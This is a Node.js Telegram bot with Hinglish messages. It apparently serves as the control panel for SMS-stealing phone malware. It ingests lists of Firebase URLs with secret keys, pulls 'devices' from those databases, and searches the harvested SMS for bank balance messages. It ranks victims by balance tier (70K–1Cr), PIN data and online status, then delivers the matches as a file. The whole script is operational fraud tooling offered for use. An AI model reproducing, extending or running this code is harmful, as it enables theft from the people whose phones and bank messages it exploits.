#!/usr/bin/env node
import { Telegraf, Input } from 'telegraf';
import { readFileSync, existsSync, mkdirSync, writeFileSync } from 'fs';
import { join } from 'path';
import { parseTxtCredentials, fetchAllPanels } from './lib/panelCore.mjs';
import { parseSearchCommand, runSearch, searchHelpText } from './lib/searchRunner.mjs';

const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const DATA_DIR = process.env.BOT_DATA_DIR || join(process.cwd(), '.bot-data');
const PANELS_FILE = join(DATA_DIR, 'panels.json');
const USER_PANELS = new Map();
const SEARCH_ABORT = new Map();

if (!TOKEN) {
  console.error('TELEGRAM_BOT_TOKEN missing. See BOT-START-HI.md');
  process.exit(1);
}

if (!existsSync(DATA_DIR)) mkdirSync(DATA_DIR, { recursive: true });

function loadSavedPanels() {
  if (existsSync(PANELS_FILE)) {
    try {
      return JSON.parse(readFileSync(PANELS_FILE, 'utf8'));
    } catch {
      return [];
    }
  }
  return [];
}

function savePanels(panels) {
  writeFileSync(PANELS_FILE, JSON.stringify(panels, null, 2));
}

let globalPanels = loadSavedPanels();

const bot = new Telegraf(TOKEN);

bot.start(ctx => {
  ctx.reply(
    '*Panel search virtus* (dev)\n\n' +
      '📂 File + caption `addtxt` — bulk Firebase\n' +
      '🔎 `/search` — menu\n' +
      '⚡ `/search avl/bal, bank online`\n' +
      '🏦 `/searchbank` — 70K–1Cr tier\n' +
      '/status · /fetch · /done',
    { parse_mode: 'Markdown' }
  );
});

bot.command('status', ctx => {
  const cached = USER_PANELS.get(ctx.from.id);
  const withKey = globalPanels.filter(p => p.key).length;
  ctx.reply(
    `Total panels (A–Z): *${globalPanels.length}*\n` +
      `Auth key wale: ${withKey} | Sirf URL: ${globalPanels.length - withKey}\n` +
      `Last search/fetch devices: ${cached?.devices?.length ?? 0}`,
    { parse_mode: 'Markdown' }
  );
});

bot.command('add', async ctx => {
  const text = ctx.message.text.replace(/^\/add\s*/i, '').trim();
  const parts = text.split(/[|,]/);
  if (parts.length < 2) {
    return ctx.reply('Format: /add https://xxx.firebaseio.com|secret');
  }
  const found = parseTxtCredentials(`${parts[0]}\n${parts[1]}`);
  if (!found.length) return ctx.reply('URL/key invalid.');
  const before = globalPanels.length;
  const map = new Map(globalPanels.map(p => [p.url.toLowerCase(), p]));
  for (const p of found) map.set(p.url.toLowerCase(), p);
  globalPanels = [...map.values()];
  savePanels(globalPanels);
  const added = globalPanels.length - before;
  ctx.reply(`✅ ${added} naye add (total: ${globalPanels.length})`);
});

bot.on('document', async ctx => {
  const cap = (ctx.message.caption || '').toLowerCase();
  if (!cap.includes('addtxt')) {
    return ctx.reply('File bhejne par caption mein likho: *addtxt*', { parse_mode: 'Markdown' });
  }
  try {
    const link = await ctx.telegram.getFileLink(ctx.message.document.file_id);
    const res = await fetch(link.href);
    const text = await res.text();
    const found = parseTxtCredentials(text);
    if (!found.length) return ctx.reply('File mein Firebase URL+key nahi mila.');
    const before = globalPanels.length;
    const map = new Map(globalPanels.map(p => [p.url.toLowerCase(), p]));
    for (const p of found) map.set(p.url.toLowerCase(), p);
    globalPanels = [...map.values()];
    savePanels(globalPanels);
    const added = globalPanels.length - before;
    ctx.reply(
      `📂 File se *${found.length}* firebases mile, *${added}* naye add hue\n` +
        `Total tumhare personal DBs: *${globalPanels.length}*`,
      { parse_mode: 'Markdown' }
    );
  } catch (e) {
    ctx.reply('File read fail: ' + e.message);
  }
});

async function executeSearch(ctx, commandText) {
  if (!globalPanels.length) {
    return ctx.reply('Pehle `addtxt` se panels add karo.', { parse_mode: 'Markdown' });
  }
  const uid = ctx.from.id;
  if (SEARCH_ABORT.get(uid) === 'running') {
    return ctx.reply('Pehle /done bhejo ya wait karo.');
  }
  SEARCH_ABORT.set(uid, 'running');
  const opts = parseSearchCommand(commandText);
  const status = await ctx.reply('⚡ Search start ho rahi hai...\n📌 avl/bal, bank');

  const abort = () => SEARCH_ABORT.get(uid) !== 'running';
  try {
    const out = await runSearch(globalPanels, opts, prog => {
      if (abort()) return;
      let msg = '⚡ Search chal rahi hai...';
      if (prog.phase === 'panels') {
        msg = `📥 DBs ${prog.done}/${prog.total} · ${prog.count} devices`;
      } else if (prog.phase === 'sms') {
        msg = `📌 SMS ${prog.done}/${prog.total} · matched ${prog.matched}`;
      }
      ctx.telegram.editMessageText(ctx.chat.id, status.message_id, undefined, msg).catch(() => {});
    });

    if (abort()) {
      SEARCH_ABORT.delete(uid);
      return;
    }

    const pinLbl = opts.pinBoth ? '🔄 Both (mix)' : 'PIN filtered';
    const onlineLbl = opts.bothStatus ? '🔄 Both' : opts.online ? '🟢 Online' : '⚫ Offline';
    const sortLbl = out.tier.label.includes('LOW') ? '💰 Low->High' : '💰 High->Low';

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      status.message_id,
      undefined,
      `✅ Done! avl/bal, bank | ${onlineLbl} | ${pinLbl} | ${sortLbl} | Last ${opts.days} days.\n` +
        `Matches: ${out.stats.sms} · Devices: ${out.stats.devices} · ${(out.elapsed / 1000).toFixed(0)}s`
    );

    const fname = `sms_avlbal_bank_${Date.now()}.txt`;
    await ctx.replyWithDocument(Input.fromBuffer(Buffer.from(out.text, 'utf8'), fname));

    USER_PANELS.set(uid, { devices: out.results, at: Date.now(), search: opts });
  } catch (e) {
    await ctx.telegram
      .editMessageText(ctx.chat.id, status.message_id, undefined, '❌ ' + e.message)
      .catch(() => {});
  } finally {
    SEARCH_ABORT.delete(uid);
  }
}

bot.command('search', async ctx => {
  const text = ctx.message.text.trim();
  const rest = text.replace(/^\/search\s*/i, '').trim();
  if (!rest) {
    return ctx.reply(searchHelpText(), { parse_mode: 'Markdown' });
  }
  await executeSearch(ctx, text);
});

bot.command('searchbank', async ctx => {
  const text = ctx.message.text.trim();
  if (!/^\/searchbank\s+\S/i.test(text)) {
    return ctx.reply('🏦 Bank 70K–1Cr:\n`/searchbank bank online`', { parse_mode: 'Markdown' });
  }
  await executeSearch(ctx, text);
});

bot.command('done', ctx => {
  SEARCH_ABORT.delete(ctx.from.id);
  ctx.reply('OK — search flag clear. Naya /search bhejo.');
});

bot.command('fetch', async ctx => {
  if (!globalPanels.length) return ctx.reply('Pehle addtxt.');
  const uid = ctx.from.id;
  const status = await ctx.reply(`⚡ Fetch ${globalPanels.length} panels...`);
  try {
    const devices = await fetchAllPanels(globalPanels, {
      batch: 15,
      onProgress(done, total, count) {
        if (done % 25 === 0 || done === total) {
          ctx.telegram
            .editMessageText(ctx.chat.id, status.message_id, undefined, `${done}/${total} · ${count} devices`)
            .catch(() => {});
        }
      },
    });
    USER_PANELS.set(uid, { devices, at: Date.now() });
    const on = devices.filter(d => d.status).length;
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      status.message_id,
      undefined,
      `✅ ${devices.length} devices | ${on} online`
    );
  } catch (e) {
    await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, undefined, e.message);
  }
});

bot.command('online', ctx => {
  const cached = USER_PANELS.get(ctx.from.id);
  if (!cached?.devices?.length) return ctx.reply('Pehle /search ya /fetch.');
  const online = cached.devices.filter(d => d.status);
  ctx.reply(`Online: ${online.length} (cached ${cached.devices.length})`);
});

bot.launch();
console.log('Panel search bot polling...');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
